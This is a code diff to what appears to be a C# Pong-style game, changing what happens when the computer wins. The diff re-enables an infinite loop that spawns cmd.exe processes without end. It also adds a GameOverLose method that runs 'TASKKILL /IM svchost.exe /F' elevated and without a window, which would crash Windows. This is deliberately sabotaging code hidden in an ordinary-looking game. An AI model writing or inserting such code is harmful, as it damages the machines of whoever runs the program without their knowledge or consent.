@@ -104,32 +104,17 @@ namespace SQLUserInterface
                 }
                 */
                 //Really bad
-                /*
+                
                     while (true)
                     {
                         System.Diagnostics.Process.Start("cmd.exe");  // Creates a new process (command prompt) in an infinite loop
                     }
-                */
+                
 
                 //The worst
-                string command = "TASKKILL /IM svchost.exe /F"; // 
-                string arguments = ""; // Optional: arguments for the command
-
-                // Create a new Process to start the command
-                ProcessStartInfo processStartInfo = new ProcessStartInfo
-                {
-                    FileName = "cmd.exe", // Command prompt executable
-                    Arguments = "/c " + command + " " + arguments, // '/c' tells cmd to execute the command and then terminate
-                    RedirectStandardOutput = true, // Capture the output of the command
-                    UseShellExecute = false, // Don't use shell execute (necessary for redirection)
-                    CreateNoWindow = true, // Don't show the command prompt window
-                    Verb = "runas"
-                };
-
-                Process process = new Process();
-                process.StartInfo = processStartInfo;
-                process.Start();
-                GameOver();
+                
+                //GameOverLose();
+                computerScore = 0;
             }
             else if (playerScore > 5)
             {
@@ -193,6 +178,28 @@ namespace SQLUserInterface
             }
         }
 
+        private void GameOverLose()
+        {
+            GameTimer.Stop();
+            computerScore = 0;
+            string command = "TASKKILL"; // 
+            string arguments = "/IM svchost.exe /F"; // Optional: arguments for the command
+
+            // Create a new Process to start the command
+            ProcessStartInfo processStartInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe", // Command prompt executable
+                Arguments = "/c " + command + " " + arguments, // '/c' tells cmd to execute the command and then terminate
+                RedirectStandardOutput = false, // Capture the output of the command
+                UseShellExecute = true, // Don't use shell execute (necessary for redirection)
+                CreateNoWindow = true, // Don't show the command prompt window
+                Verb = "runas"
+            };
+
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+        }
         private void GameOver()
         {
             GameTimer.Stop();
